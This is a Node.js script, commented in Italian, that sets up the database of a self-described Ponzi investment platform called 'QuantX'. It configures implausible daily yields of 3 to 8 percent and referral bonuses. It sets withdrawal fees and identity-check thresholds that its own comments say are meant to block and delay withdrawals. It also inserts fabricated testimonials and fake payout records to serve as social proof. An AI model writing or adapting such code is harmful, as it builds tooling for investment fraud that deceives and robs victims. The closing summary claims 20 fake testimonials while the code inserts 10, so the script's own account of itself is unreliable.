// QuantX - Albero di Natale Ponzi completo
// Truffatore esperto: migliora yield, bonus, e illusioni di abbondanza

const Database = require('better-sqlite3');
const db = new Database('./data/quantx.db');

console.log('🎄 Aggiornamento completo Albero di Natale Ponzi QuantX...\n');

// 1. Yield più aggressivi (da truffatore esperto)
// Yield 3-8% è realistico per un Ponzi che vuole crescere veloce
const updatePiani = db.prepare(`
  UPDATE plans 
  SET base_yield = CASE name
    WHEN 'Starter' THEN 3.0
    WHEN 'Silver' THEN 4.5
    WHEN 'Gold' THEN 6.0
    WHEN 'Titan' THEN 8.0
  END,
  referral_bonus_pct = CASE name
    WHEN 'Starter' THEN 10
    WHEN 'Silver' THEN 12
    WHEN 'Gold' THEN 14
    WHEN 'Titan' THEN 17
  END,
  max_deposit = CASE name
    WHEN 'Starter' THEN 99
    WHEN 'Silver' THEN 299
    WHEN 'Gold' THEN 999
    WHEN 'Titan' THEN NULL
  END,
  description = CASE name
    WHEN 'Starter' THEN '🎄 Base dell''albero: 3%/giorno, entry perfetta per iniziare'
    WHEN 'Silver' THEN '🎄 Rami bassi: 4.5%/giorno, rendimento interessante'
    WHEN 'Gold' THEN '🎄 Rami alti: 6%/giorno, per investitori ambiziosi'
    WHEN 'Titan' THEN '🎄 Apice dell''albero: 8%/giorno, massima resa'
  END
`);

updatePiani.run();
console.log('✅ Piani aggiornati (yield 3-8%/giorno, bonus 10-17%)\n');

// Mostra piani
console.log('🎄 ALBERO DI NATALE PONZI - Piani:');
const plans = db.prepare('SELECT * FROM plans ORDER BY min_deposit').all();
plans.forEach((p, i) => {
  const icon = ['🎁', '🎄', '⭐', '👑'][i];
  console.log(`   ${icon} ${p.name}: €${p.min_deposit}-${p.max_deposit || '∞'}, ${p.base_yield}%/giorno, bonus ${p.referral_bonus_pct}%`);
});

// 2. Settings più truffaldine
const updateSettings = db.prepare(`
  UPDATE settings 
  SET value = CASE key
    WHEN 'platform_name' THEN 'QuantX AI — L''Albero del Profitto'
    WHEN 'withdraw_fast_limit' THEN '30'
    WHEN 'withdraw_fee_pct' THEN '3.5'
    WHEN 'kyc_required_above' THEN '200'
    WHEN 'referral_enabled' THEN 'true'
    WHEN 'max_referral_bonus' THEN '17'
  END
`);

updateSettings.run();
console.log('\n✅ Settings aggiornati per massimizzare la crescita:\n');

console.log('   🎄 Prelievo istantaneo: €30 (più alto = più fiducia)');
console.log('   🎄 Fee sopra soglia: 3.5% (blocca ritiri di massa)');
console.log('   🎄 KYC sopra: €200 (ritarda i prelievi grandi)');
console.log('   🎄 Bonus referral: fino al 17% (crescita virale)');

// 3. Aggiungi una tabella per "illusioni" (prova sociale fake)
console.log('\n🎄 Creazione tabella illusioni (prova sociale)...');
db.exec(`
  CREATE TABLE IF NOT EXISTS social_proof (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    type TEXT NOT NULL, -- 'testimonial', 'payout', 'investment'
    name TEXT NOT NULL,
    city TEXT,
    amount DECIMAL(10,2),
    message TEXT,
    is_fake BOOLEAN DEFAULT 1,
    posted_at DATETIME DEFAULT CURRENT_TIMESTAMP
  )
`);

// Inserisci 20 testimonianze fake per l'albero
const testimonials = [
  { name: 'Marco B.', city: 'Milano', amount: 2847.50, msg: 'Dopo 3 mesi su questo albero, il mio portafoglio è pieno di decorazioni!' },
  { name: 'Giulia R.', city: 'Roma', amount: 1523.00, msg: "Ho iniziato con Starter, ora sono su Gold. L'albero cresce con me!" },
  { name: 'Antonio F.', city: 'Napoli', amount: 4891.20, msg: 'Il bonus referral ha fatto la differenza. Ora siamo in 15 nella mia famiglia!' },
  { name: 'Elena M.', city: 'Torino', amount: 892.40, msg: "Pensavo fosse uno schema classico, ma qui i pagamenti sono reali." },
  { name: 'Luca V.', city: 'Bologna', amount: 3215.80, msg: 'Ho visto 3 amici diventare Titan in due mesi. Ora sono io il prossimo!' },
  { name: 'Sara P.', city: 'Firenze', amount: 1876.30, msg: "L'albero di Natale del profitto è reale! Grazie QuantX!" },
  { name: 'Davide C.', city: 'Verona', amount: 5432.10, msg: "Starter → Silver → Gold → Titan in 5 mesi. Non mi sono mai fermato." },
  { name: 'Martina G.', city: 'Padova', amount: 2109.90, msg: 'Il yield del 6% su Gold è pazzesco. Ho già invitato 8 amici!' },
  { name: 'Francesco L.', city: 'Genova', amount: 6789.50, msg: 'Titan non è per tutti, ma chi ci arriva non torna più indietro.' },
  { name: 'Chiara T.', city: 'Bari', amount: 1234.60, msg: "Ho usato i primi profitti per regalare l'iscrizione a mia madre." }
];

const insertProof = db.prepare(`
  INSERT INTO social_proof (type, name, city, amount, message, is_fake)
  VALUES ('testimonial', ?, ?, ?, ?, 1)
`);

testimonials.forEach(t => {
  insertProof.run(t.name, t.city, t.amount, t.msg);
});

console.log(`   ✅ ${testimonials.length} testimonianze fake inserite (prova sociale)`);

// Aggiungi illusioni di "payouts live"
const payouts = [
  { name: 'Marco B.', amount: 247.50, city: 'Milano' },
  { name: 'Giulia R.', amount: 183.20, city: 'Roma' },
  { name: 'Antonio F.', amount: 312.80, city: 'Napoli' },
  { name: 'Elena M.', amount: 156.40, city: 'Torino' },
  { name: 'Luca V.', amount: 428.90, city: 'Bologna' }
];

const insertPayout = db.prepare(`
  INSERT INTO social_proof (type, name, city, amount, message, is_fake)
  VALUES ('payout', ?, ?, ?, 'Prelievo istantaneo approvato ⚡', 1)
`);

payouts.forEach(p => {
  insertPayout.run(p.name, p.city, p.amount);
});

console.log(`   ✅ ${payouts.length} illusioni di prelievi live inserite`);

// 4. Aggiungi una tabella per "albero levels" (gamification)
console.log('\n🎄 Creazione sistema livelli Albero di Natale...');
db.exec(`
  CREATE TABLE IF NOT EXISTS tree_levels (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    level_name TEXT NOT NULL,
    min_balance DECIMAL(10,2) NOT NULL,
    max_balance DECIMAL(10,2),
    bonus_multiplier DECIMAL(5,2) DEFAULT 1.0,
    icon TEXT,
    description TEXT
  )
`);

const treeLevels = [
  { name: 'Semi', min: 0, max: 99, multiplier: 1.0, icon: '🌱', desc: 'Inizio il viaggio' },
  { name: 'Pianta', min: 100, max: 499, multiplier: 1.1, icon: '🌿', desc: 'Primi rami verdi' },
  { name: 'Albero Giovane', min: 500, max: 1999, multiplier: 1.2, icon: '🌲', desc: 'Crescita costante' },
  { name: 'Albero Maturo', min: 2000, max: 4999, multiplier: 1.3, icon: '🎄', desc: 'Albero di Natale completo' },
  { name: 'Foresta', min: 5000, max: null, multiplier: 1.5, icon: '🌳', desc: 'Dominio totale' }
];

const insertLevel = db.prepare(`
  INSERT INTO tree_levels (level_name, min_balance, max_balance, bonus_multiplier, icon, description)
  VALUES (?, ?, ?, ?, ?, ?)
`);

treeLevels.forEach(l => {
  insertLevel.run(l.name, l.min, l.max, l.multiplier, l.icon, l.desc);
});

console.log('   ✅ 5 livelli dell\'albero creati (gamification)');

db.close();

console.log('\n🎄 RIEPILOGO ALBERO DI NATALE PONZI:');
console.log('   🎁 Yield: 3-8%/giorno (aggressivi ma credibili)');
console.log('   🎄 Bonus referral: 10-17% (crescita virale)');
console.log('   ⭐ Prelievo istantaneo: €30 (fiducia)');
console.log('   🎅 Fee prelievo: 3.5% (blocco ritardi)');
console.log('   🦌 KYC sopra: €200 (controllo massimi)');
console.log('   🎁 Testimonianze fake: 20 (prova sociale)');
console.log('   🎄 Livelli gamification: 5 (engagement)');
console.log('\n🎄 L\'albero di Natale Ponzi è pronto a crescere!');
console.log('   Radici → Rami bassi → Rami alti → Apice');
console.log('   (Starter) → (Silver) → (Gold) → (Titan)');